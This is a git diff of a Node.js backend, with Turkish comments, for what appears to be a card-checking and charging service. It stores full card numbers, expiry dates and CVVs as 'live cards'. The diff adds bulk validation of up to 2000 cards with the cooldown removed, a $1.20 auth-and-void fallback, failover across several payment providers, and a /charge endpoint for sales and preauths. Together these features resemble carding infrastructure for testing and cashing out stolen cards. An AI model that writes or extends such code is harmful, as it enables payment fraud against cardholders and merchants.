       chargeId: result.transactionId || result.chargeId || result.raw?.id || null,
       transactionId: result.transactionId || result.chargeId || result.raw?.id || null,
       txnId: saved?.id || null,
-      refundedAmount,
-      refundTxnId,
+      refundedAmount, refundTxnId,
       netAmount: amount - refundedAmount,
       voided: false,
       duration,
@@ -819,8 +1092,7 @@ module.exports = (deps) => {
     for (let i = 0; i < priority.length; i++) {
       const key = normalizeProviderKey(priority[i]);
       const outcome = await runPreauthViaProvider(card, amount, key, cardChecker, {
-        ...ctx,
-        refundAmount,
+        ...ctx, refundAmount,
       });
 
       attempts.push({
@@ -837,7 +1109,6 @@ module.exports = (deps) => {
       }
 
       if (!outcome.failover) {
-        // Gerçek kart reddi → devam etme
         return { ...outcome, attempts, finalProvider: key, failoverUsed: i > 0 };
       }
 
@@ -912,6 +1183,11 @@ module.exports = (deps) => {
           lcf.*,
           u.username AS checked_by_username,
           COALESCE(cc.check_count, 0) AS check_count_from_checks,
+          EXISTS (
+            SELECT 1 FROM charge_audit ca
+            WHERE ca.live_card_id = lcf.id
+              AND ca.action IN ('sale','preauth','auth','live_check','capture')
+          ) AS has_transactions,
           cc.last_checked_at AS last_checked_at_from_checks,
           COALESCE(agg.total_auth, 0)      AS total_auth,
           COALESCE(agg.total_captured, 0)  AS total_captured,
@@ -954,14 +1230,22 @@ module.exports = (deps) => {
       `;
       const params = [];
 
-      if (user.role === 'admin' && all === 'true') {
-        // tümü
-      } else if (user.role === 'admin') {
-        params.push(user.id);
+      const isAdmin = user.role === 'admin';
+      const showAll = isAdmin && all !== 'false';
+
+      if (!showAll) {
+        if (isAdmin) {
+          params.push(user.id);
+          query += ` AND lcf.user_id = $${params.length}`;
+        } else {
+          params.push(user.id);
+          query += ` AND (lcf.checked_by_user_id = $${params.length} OR lcf.user_id = $${params.length})`;
+        }
+      }
+
+      if (isAdmin && req.query.userId && /^\d+$/.test(String(req.query.userId))) {
+        params.push(Number(req.query.userId));
         query += ` AND lcf.user_id = $${params.length}`;
-      } else {
-        params.push(user.id);
-        query += ` AND (lcf.checked_by_user_id = $${params.length} OR lcf.user_id = $${params.length})`;
       }
 
       if (country) { params.push(country); query += ` AND lcf.country = $${params.length}`; }
@@ -1007,6 +1291,7 @@ module.exports = (deps) => {
       params.push(parseInt(limit));
       query += `
         ORDER BY 
+          lcf.last_imported_at DESC NULLS LAST,
           CASE WHEN lcf.status = 'LIVE' THEN 0 ELSE 1 END,
           COALESCE(lcf.last_checked_at, lcf.updated_at) DESC NULLS LAST,
           lcf.id DESC
@@ -1059,6 +1344,11 @@ module.exports = (deps) => {
           dead_reason_short: deadMapped?.short || null,
           dead_reason_long: deadMapped?.long || null,
           total_declined_count: parseInt(card.total_declined_count) || 0,
+          last_imported_at: card.last_imported_at || null,
+          has_transactions: card.has_transactions === true,
+          is_recently_imported: card.last_imported_at
+            ? (Date.now() - new Date(card.last_imported_at).getTime()) < 24 * 3600 * 1000
+            : false,
           favLists: matchedFavs.map((f) => ({ id: f.id, name: f.name, color: f.color })),
         };
       });
@@ -1066,14 +1356,18 @@ module.exports = (deps) => {
       let countQuery = 'SELECT COUNT(*) FROM live_cards_full lcf WHERE 1=1';
       const countParams = [];
 
-      if (user.role === 'admin' && all === 'true') {
-        // tümü
-      } else if (user.role === 'admin') {
-        countParams.push(user.id);
+      if (!showAll) {
+        if (isAdmin) {
+          countParams.push(user.id);
+          countQuery += ` AND lcf.user_id = $${countParams.length}`;
+        } else {
+          countParams.push(user.id);
+          countQuery += ` AND (lcf.checked_by_user_id = $${countParams.length} OR lcf.user_id = $${countParams.length})`;
+        }
+      }
+      if (isAdmin && req.query.userId && /^\d+$/.test(String(req.query.userId))) {
+        countParams.push(Number(req.query.userId));
         countQuery += ` AND lcf.user_id = $${countParams.length}`;
-      } else {
-        countParams.push(user.id);
-        countQuery += ` AND (lcf.checked_by_user_id = $${countParams.length} OR lcf.user_id = $${countParams.length})`;
       }
 
       if (country) { countParams.push(country); countQuery += ` AND lcf.country = $${countParams.length}`; }
@@ -1134,12 +1428,18 @@ module.exports = (deps) => {
   // ============================================================
   router.get('/live-cards/:id', authMiddleware, async (req, res) => {
     const { id } = req.params;
+    const isAdmin = req.user.role === 'admin';
     try {
       const cardResult = await db.pool.query(
         `SELECT 
            lcf.*,
            u.username AS checked_by_username,
            COALESCE(cc.check_count, 0) AS check_count_from_checks,
+           EXISTS (
+             SELECT 1 FROM charge_audit ca
+             WHERE ca.live_card_id = lcf.id
+               AND ca.action IN ('sale','preauth','auth','live_check','capture')
+           ) AS has_transactions,
            cc.last_checked_at AS last_checked_at_from_checks,
            COALESCE(agg.total_auth, 0)      AS total_auth,
            COALESCE(agg.total_captured, 0)  AS total_captured,
@@ -1178,8 +1478,9 @@ module.exports = (deps) => {
            WHERE live_card_id IS NOT NULL
            GROUP BY live_card_id
          ) agg ON agg.live_card_id = lcf.id
-         WHERE lcf.id = $1 AND (lcf.user_id = $2 OR lcf.checked_by_user_id = $2)`,
-        [id, req.user.id]
+         WHERE lcf.id = $1
+           AND ($2::boolean OR lcf.user_id = $3 OR lcf.checked_by_user_id = $3)`,
+        [id, isAdmin, req.user.id]
       );
 
       if (cardResult.rows.length === 0) {
@@ -1232,6 +1533,11 @@ module.exports = (deps) => {
         dead_reason_short: deadMapped?.short || null,
         dead_reason_long: deadMapped?.long || null,
         total_declined_count: parseInt(card.total_declined_count) || 0,
+        last_imported_at: card.last_imported_at || null,
+        has_transactions: card.has_transactions === true,
+        is_recently_imported: card.last_imported_at
+          ? (Date.now() - new Date(card.last_imported_at).getTime()) < 24 * 3600 * 1000
+          : false,
         favLists: matchedFavs.map((f) => ({ id: f.id, name: f.name, color: f.color })),
       });
     } catch (e) {
@@ -1285,7 +1591,6 @@ module.exports = (deps) => {
           [parsed.pan, providerKey, req.user.id, normalized.reason, mapped.long]
         ).catch(() => {});
       }
-      // ERROR / UNKNOWN → status'a dokunma
 
       res.json(normalized);
     } catch (e) {
@@ -1318,32 +1623,42 @@ module.exports = (deps) => {
 
       const card = cardResult.rows[0];
 
-      // ⭐ COOLDOWN: bulk = 24 saat, tekli = 1 saat
-      const cooldownHours = bulkMode ? 24 : 1;
-      const recent = await db.pool.query(
-        `SELECT COUNT(*)::int AS cnt FROM charge_audit
-         WHERE live_card_id = $1
-           AND action = 'live_check'
-           AND created_at > NOW() - ($2 || ' hours')::interval`,
-        [id, String(cooldownHours)]
-      );
+      const cooldownMinutes = bulkMode ? 0 : 5;
 
-      if (recent.rows[0].cnt > 0) {
-        return res.status(429).json({
-          success: false,
-          status: 'ERROR',
-          reason: 'recheck_cooldown',
-          reasonShort: 'Cooldown',
-          reasonLong: `Bu kart için son ${cooldownHours} saat içinde check yapılmış. Tekrar denemek için bekleyin.`,
-        });
+      if (cooldownMinutes > 0) {
+        const recent = await db.pool.query(
+          `SELECT COUNT(*)::int AS cnt FROM charge_audit
+           WHERE live_card_id = $1
+             AND action = 'live_check'
+             AND created_at > NOW() - ($2 || ' minutes')::interval`,
+          [id, String(cooldownMinutes)]
+        );
+
+        if (recent.rows[0].cnt > 0) {
+          return res.status(429).json({
+            success: false, status: 'ERROR', reason: 'recheck_cooldown',
+            reasonShort: 'Cooldown',
+            reasonLong: `Bu kart için son ${cooldownMinutes} dk içinde check yapılmış.`,
+          });
+        }
       }
 
-      // ⭐ bulkMode'u tryLiveCheckViaCardChecker'a geç
-      const outcome = await tryLiveCheckViaCardChecker(
+      let outcome = await tryLiveCheckViaCardChecker(
         { ...card, id: card.id },
         cardChecker,
         { userId: req.user.id, bulkMode }
       );
+
+      // ⭐ zero_auth_unsupported → $1.2 fallback
+      if (!outcome.success && outcome.reason === 'zero_auth_unsupported') {
+        console.log(`[RECHECK] ${card.pan?.slice(0, 6)}**** → $0 yok, $1.2 fallback`);
+        const fallback = await tryLiveCheckWithAmount(
+          { ...card, id: card.id },
+          cardChecker,
+          { userId: req.user.id, amount: 1.2 }
+        );
+        if (fallback) outcome = fallback;
+      }
 
       const response = normalizeBalanceResponse(outcome, 'live_check');
       res.json(response);
@@ -1351,13 +1666,177 @@ module.exports = (deps) => {
       console.error('[RECHECK]', e.message);
       const mapped = mapReason('provider_error', e.message);
       res.status(500).json({
-        success: false,
-        status: 'ERROR',
-        reason: 'provider_error',
-        reasonShort: mapped.short,
-        reasonLong: mapped.long,
+        success: false, status: 'ERROR', reason: 'provider_error',
+        reasonShort: mapped.short, reasonLong: mapped.long,
         error: e.message,
       });
+    }
+  });
+
+  // ============================================================
+  // POST /live-cards/bulk-recheck
+  // ============================================================
+  router.post('/live-cards/bulk-recheck', authMiddleware, async (req, res) => {
+    const { ids = [], filter = {}, bulkMode = true } = req.body || {};
+
+    try {
+      let targetQuery;
+      let targetParams;
+
+      if (Array.isArray(ids) && ids.length > 0) {
+        if (ids.length > 500) {
+          return res.status(400).json({ error: 'Tek seferde en fazla 500 kart' });
+        }
+        targetQuery = `
+          SELECT id, pan, exp, cvv, name, type, banka, country
+          FROM live_cards_full
+          WHERE id = ANY($1::int[])
+            AND (user_id = $2 OR checked_by_user_id = $2 OR $3::boolean = TRUE)
+          ORDER BY id
+        `;
+        targetParams = [ids, req.user.id, req.user.role === 'admin'];
+      } else {
+        const where = [];
+        const params = [];
+        const isAdmin = req.user.role === 'admin';
+        const showAll = isAdmin && filter.all !== false;
+
+        if (!showAll) {
+          params.push(req.user.id);
+          where.push(`(user_id = $${params.length} OR checked_by_user_id = $${params.length})`);
+        }
+        if (isAdmin && filter.userId && /^\d+$/.test(String(filter.userId))) {
+          params.push(Number(filter.userId));
+          where.push(`user_id = $${params.length}`);
+        }
+        if (filter.status) {
+          params.push(String(filter.status).toUpperCase());
+          where.push(`COALESCE(status,'LIVE') = $${params.length}`);
+        }
+        if (filter.bin) {
+          params.push(`${filter.bin}%`);
+          where.push(`pan LIKE $${params.length}`);
+        }
+        if (filter.country) {
+          params.push(filter.country);
+          where.push(`country = $${params.length}`);
+        }
+        if (filter.banka) {
+          params.push(`%${filter.banka}%`);
+          where.push(`banka ILIKE $${params.length}`);
+        }
+        if (filter.cardType) {
+          const t = String(filter.cardType).toUpperCase();
+          if (t === 'PREPAID') where.push(`COALESCE(level,'') ILIKE '%PREPAID%'`);
+          else if (t === 'DEBIT') where.push(`UPPER(COALESCE(type,'')) = 'DEBIT' AND COALESCE(level,'') NOT ILIKE '%PREPAID%'`);
+          else if (t === 'CREDIT') where.push(`UPPER(COALESCE(type,'')) = 'CREDIT' AND COALESCE(level,'') NOT ILIKE '%PREPAID%'`);
+        }
+
+        params.push(2000);
+        targetQuery = `
+          SELECT id, pan, exp, cvv, name, type, banka, country
+          FROM live_cards_full
+          ${where.length ? `WHERE ${where.join(' AND ')}` : ''}
+          ORDER BY COALESCE(last_checked_at, updated_at) ASC NULLS FIRST
+          LIMIT $${params.length}
+        `;
+        targetParams = params;
+      }
+
+      const targets = await db.pool.query(targetQuery, targetParams);
+      if (!targets.rowCount) {
+        return res.status(404).json({ error: 'Hedef kart bulunamadı' });
+      }
+
+      res.setHeader('Content-Type', 'application/x-ndjson');
+      res.setHeader('Cache-Control', 'no-cache');
+      res.setHeader('Connection', 'keep-alive');
+      res.setHeader('X-Accel-Buffering', 'no');
+      res.flushHeaders();
+
+      res.write(JSON.stringify({ type: 'start', total: targets.rowCount }) + '\n');
+
+      let approved = 0, declined = 0, errors = 0;
+      const t0 = Date.now();
+
+      for (let i = 0; i < targets.rowCount; i++) {
+        const card = targets.rows[i];
+        try {
+          let outcome = await tryLiveCheckViaCardChecker(
+            { ...card, id: card.id },
+            cardChecker,
+            { userId: req.user.id, bulkMode: true }
+          );
+
+          // ⭐ zero_auth_unsupported → $1.2 fallback
+          if (!outcome.success && outcome.reason === 'zero_auth_unsupported') {
+            console.log(
+              `[BULK-RECHECK] ${card.pan?.slice(0, 6)}**** → $0 yok, $1.2 + void fallback`
+            );
+            const fallback = await tryLiveCheckWithAmount(
+              { ...card, id: card.id },
+              cardChecker,
+              { userId: req.user.id, amount: 1.2 }
+            );
+            if (fallback) outcome = fallback;
+          }
+
+          const isSuccess = outcome.ok && outcome.success;
+          const isError = outcome.status === 'ERROR' || outcome.failover;
+
+          if (isSuccess) approved++;
+          else if (isError) errors++;
+          else declined++;
+
+          res.write(JSON.stringify({
+            type: 'result',
+            index: i + 1,
+            total: targets.rowCount,
+            id: card.id,
+            pan: card.pan ? card.pan.slice(0, 6) + '****' + card.pan.slice(-4) : null,
+            status: outcome.status,
+            success: !!isSuccess,
+            reason: outcome.reason || null,
+            reasonShort: outcome.reasonShort || null,
+            provider: outcome.providerKey || null,
+            verifyAmount: outcome.verifyAmount || 0,
+            voided: outcome.voided ?? null,
+            duration: outcome.duration || null,
+          }) + '\n');
+        } catch (e) {
+          errors++;
+          res.write(JSON.stringify({
+            type: 'result',
+            index: i + 1,
+            total: targets.rowCount,
+            id: card.id,
+            status: 'ERROR',
+            success: false,
+            reason: 'provider_error',
+            message: e.message,
+          }) + '\n');
+        }
+      }
+
+      res.write(JSON.stringify({
+        type: 'end',
+        summary: {
+          total: targets.rowCount,
+          approved,
+          declined,
+          errors,
+          durationMs: Date.now() - t0,
+        },
+      }) + '\n');
+      res.end();
+    } catch (e) {
+      console.error('[BULK-RECHECK]', e.message);
+      if (!res.headersSent) {
+        res.status(500).json({ error: e.message });
+      } else {
+        res.write(JSON.stringify({ type: 'error', message: e.message }) + '\n');
+        res.end();
+      }
     }
   });
 
@@ -1366,12 +1845,7 @@ module.exports = (deps) => {
   // ============================================================
   router.post('/live-cards/:id/balance-check', authMiddleware, async (req, res) => {
     const { id } = req.params;
-    const {
-      amount = 1,
-      refundAmount = null,
-      provider: forcedProvider,
-      operation = 'preauth',
-    } = req.body;
+    const { amount = 1, refundAmount = null, provider: forcedProvider, operation = 'preauth' } = req.body;
 
     const isLiveCheck = operation === 'live_check';
     const authAmount = isLiveCheck ? 0 : Number(amount);
@@ -1406,10 +1880,8 @@ module.exports = (deps) => {
         }
       }
 
-      const effectiveRefund = isLiveCheck
-        ? 0
-        : refundAmount != null
-        ? Number(refundAmount)
+      const effectiveRefund = isLiveCheck ? 0
+        : refundAmount != null ? Number(refundAmount)
         : (balanceCfg.refundAmount ?? 0);
 
       let outcome;
@@ -1471,12 +1943,7 @@ module.exports = (deps) => {
   // POST /balance-check (raw card)
   // ============================================================
   router.post('/balance-check', authMiddleware, async (req, res) => {
-    const {
-      card, amount,
-      refundAmount = null,
-      provider: forcedProvider,
-      operation = 'preauth',
-    } = req.body;
+    const { card, amount, refundAmount = null, provider: forcedProvider, operation = 'preauth' } = req.body;
     if (!card) return res.status(400).json({ error: 'card gerekli' });
 
     const isLiveCheck = operation === 'live_check';
@@ -1518,10 +1985,8 @@ module.exports = (deps) => {
       }
     }
 
-    const effectiveRefund = isLiveCheck
-      ? 0
-      : refundAmount != null
-      ? Number(refundAmount)
+    const effectiveRefund = isLiveCheck ? 0
+      : refundAmount != null ? Number(refundAmount)
       : (balanceCfg.refundAmount ?? 0);
 
     try {
@@ -1705,10 +2170,7 @@ module.exports = (deps) => {
       let result;
       try {
         result = await cardChecker.voidWithProvider(
-          txn.provider_txn_id,
-          providerKey,
-          null,
-          txn.amount
+          txn.provider_txn_id, providerKey, null, txn.amount
         );
       } catch (e) {
         return res.status(500).json({ error: e.message });
@@ -1736,11 +2198,9 @@ module.exports = (deps) => {
       }
 
       res.json({
-        success,
-        status: success ? 'voided' : 'error',
+        success, status: success ? 'voided' : 'error',
         method: result.method || null,
-        error: errorMsg,
-        txnId: txn.id,
+        error: errorMsg, txnId: txn.id,
       });
     } catch (e) {
       console.error('[TXN-VOID]', e.message);
@@ -1772,9 +2232,7 @@ module.exports = (deps) => {
       let result;
       try {
         result = await cardChecker.captureWithProvider(
-          txn.provider_txn_id,
-          captureAmount,
-          providerKey
+          txn.provider_txn_id, captureAmount, providerKey
         );
       } catch (e) {
         return res.status(500).json({ error: e.message });
@@ -1815,11 +2273,9 @@ module.exports = (deps) => {
       }
 
       res.json({
-        success,
-        status: success ? 'captured' : 'error',
+        success, status: success ? 'captured' : 'error',
         capturedAmount: success ? captureAmount : 0,
-        error: errorMsg,
-        txnId: txn.id,
+        error: errorMsg, txnId: txn.id,
       });
     } catch (e) {
       console.error('[TXN-CAPTURE]', e.message);
@@ -1854,9 +2310,7 @@ module.exports = (deps) => {
       let result;
       try {
         result = await cardChecker.refundWithProvider(
-          txn.provider_txn_id,
-          refundAmount,
-          providerKey
+          txn.provider_txn_id, refundAmount, providerKey
         );
       } catch (e) {
         return res.status(500).json({ error: e.message });
@@ -1903,11 +2357,9 @@ module.exports = (deps) => {
       }
 
       res.json({
-        success,
-        status: success ? 'refunded' : 'error',
+        success, status: success ? 'refunded' : 'error',
         refundedAmount: success ? refundAmount : 0,
-        error: errorMsg,
-        txnId: txn.id,
+        error: errorMsg, txnId: txn.id,
       });
     } catch (e) {
       console.error('[TXN-REFUND]', e.message);
@@ -2026,6 +2478,160 @@ module.exports = (deps) => {
       res.status(500).json({ error: e.message });
     }
   });
+
+
+// ============================================================
+// POST /charge — card | cardId | enrollmentId + operation
+// ============================================================
+router.post('/charge', authMiddleware, async (req, res) => {
+  const {
+    card, cardId, enrollmentId, amount,
+    currency = 'USD',
+    provider: forcedProvider,
+    operation = 'sale',
+    orderId = null,
+  } = req.body || {};
+
+  const isAdmin = isAdminUser(req);
+
+  // ---- Tutar kontrolü (live_check hariç) ----
+  const chargeAmount = operation === 'live_check' ? 0 : Number(amount);
+  if (operation !== 'live_check' && (!chargeAmount || chargeAmount < 0.5)) {
+    return res.status(400).json({ error: 'Tutar en az $0.50 olmalı' });
+  }
+  if (!['sale', 'preauth', 'live_check'].includes(operation)) {
+    return res.status(400).json({ error: `Geçersiz operation: ${operation}` });
+  }
+
+  // ---- Kart kaynağı ----
+  let cardData = null;
+
+  if (enrollmentId) {
+    // Enrolled: PAN/CVV yok — token'lı path (ayrı işlem gerekebilir)
+    // Basit yaklaşım: enrollment kaydını doğrula, pos servisine devret
+    const enf = await db.pool.query(
+      `SELECT * FROM card_enrollments WHERE id = $1 ${isAdmin ? '' : 'AND user_id = $2'}`,
+      isAdmin ? [enrollmentId] : [enrollmentId, req.user.id]
+    );
+    if (!enf.rows.length) {
+      return res.status(404).json({ error: 'Enrollment bulunamadı' });
+    }
+    // NOT: Enrolled kart için token'lı provider akışı gerekir.
+    // Şimdilik 501 dönüyoruz — PosPage kendi token akışını kullanmalı.
+    return res.status(501).json({
+      error: 'Enrolled kart için token\'lı path henüz /charge\'da yok. /pos sayfasını kullan.',
+      enrollmentId,
+    });
+  }
+
+  if (cardId) {
+    const r = isAdmin
+      ? await db.pool.query('SELECT * FROM live_cards_full WHERE id = $1', [cardId])
+      : await db.pool.query(
+          'SELECT * FROM live_cards_full WHERE id = $1 AND (user_id = $2 OR checked_by_user_id = $2)',
+          [cardId, req.user.id]
+        );
+    if (!r.rows.length) return res.status(404).json({ error: 'Kart bulunamadı' });
+    cardData = r.rows[0];
+  } else if (card) {
+    const parsed = CardParser.parseFull(card) || CardParser.parseSimple(card);
+    if (!parsed) return res.status(400).json({ error: 'Geçersiz kart formatı' });
+    cardData = {
+      pan: parsed.pan,
+      exp: `${String(parsed.expMonth).padStart(2, '0')}/${parsed.expYear}`,
+      cvv: parsed.cvv,
+      type: parsed.brand || '',
+      name: parsed.name || 'Test User',
+      address: parsed.address || '',
+      city: parsed.city || '',
+      state: parsed.state || '',
+      zip: parsed.zip || '',
+      country: parsed.country || 'US',
+      phone: parsed.phone || '',
+      email: parsed.email || '',
+      id: null,
+    };
+  } else {
+    return res.status(400).json({ error: 'card, cardId veya enrollmentId gerekli' });
+  }
+
+  await recordAdminActionIfAny(req, cardData, 'card.charge', { amount: chargeAmount, orderId, operation });
+
+  // ---- Provider zinciri ----
+  const CONFIG = require('../config');
+  const balanceCfg = CONFIG.BALANCE_CHECK || {};
+  const priority = forcedProvider
+    ? [normalizeProviderKey(forcedProvider)]
+    : (Array.isArray(balanceCfg.providerPriority) && balanceCfg.providerPriority.length
+        ? balanceCfg.providerPriority.map(normalizeProviderKey)
+        : ['clover3', 'authorize3', 'moneris']);
+
+  const effectiveUserId = cardData.user_id || req.user.id;
+  const attempts = [];
+  let lastOutcome = null;
+
+  for (const key of priority) {
+    let outcome;
+
+    if (operation === 'live_check') {
+      outcome = await tryLiveCheckViaCardChecker(cardData, cardChecker, {
+        userId: effectiveUserId, preferProvider: key,
+      });
+    } else if (operation === 'preauth') {
+      outcome = await runPreauthViaProvider(
+        cardData, chargeAmount, key, cardChecker,
+        { userId: effectiveUserId, refundAmount: 0 }
+      );
+    } else {
+      outcome = await runSaleViaProvider(
+        cardData, chargeAmount, key, cardChecker,
+        { userId: effectiveUserId }
+      );
+    }
+
+    attempts.push({
+      provider: key,
+      ok: !!outcome.ok,
+      success: !!outcome.success,
+      reason: outcome.reason || null,
+      status: outcome.status || null,
+      duration: outcome.duration || null,
+    });
+
+    if (outcome.success) {
+      return res.json({
+        ...outcome,
+        attempts, finalProvider: key,
+        operation, orderId,
+        actedByAdmin: isAdmin && effectiveUserId !== req.user.id,
+        cardOwnerUserId: cardData.user_id || null,
+      });
+    }
+
+    if (!outcome.failover) {
+      return res.json({
+        ...outcome,
+        attempts, finalProvider: key,
+        operation, orderId,
+        actedByAdmin: isAdmin && effectiveUserId !== req.user.id,
+        cardOwnerUserId: cardData.user_id || null,
+      });
+    }
+
+    lastOutcome = outcome;
+  }
+
+  return res.json({
+    ...(lastOutcome || {
+      ok: false, success: false, status: 'ERROR',
+      reason: 'provider_error', message: 'Tüm providerlar başarısız',
+    }),
+    attempts, finalProvider: null,
+    operation, orderId,
+    actedByAdmin: isAdmin && effectiveUserId !== req.user.id,
+    cardOwnerUserId: cardData.user_id || null,
+  });
+});
 
   return router;
 };
